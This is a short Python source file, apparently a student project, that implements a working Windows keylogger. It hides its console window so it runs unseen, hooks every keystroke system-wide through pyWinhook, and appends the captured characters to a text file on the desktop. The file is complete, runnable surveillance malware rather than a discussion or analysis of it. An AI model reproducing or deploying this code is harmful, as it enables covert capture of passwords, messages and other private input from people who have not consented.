
import win32console
import win32gui
import pythoncom, pyWinhook
import os

win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)


def OnKeyboardEvent(event):
    if event.Ascii == 5:
        os._exit(1)  # or sys.exit(1)

    if event.Ascii not in (0, 8):
        try:
            with open(r'C:\Users\heshv\Desktop\study\PROJECTS\keylogger\ot.txt', 'r') as f:
                buffer = f.read()
        except FileNotFoundError:
            buffer = ''

        keylogs = chr(event.Ascii)
        if event.Ascii == 13:
            keylogs = '\n'

        buffer += keylogs

        with open(r'C:\Users\heshv\Desktop\study\PROJECTS\keylogger\ot.txt', 'w') as f:
            f.write(buffer)

    return True  


hm = pyWinhook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()
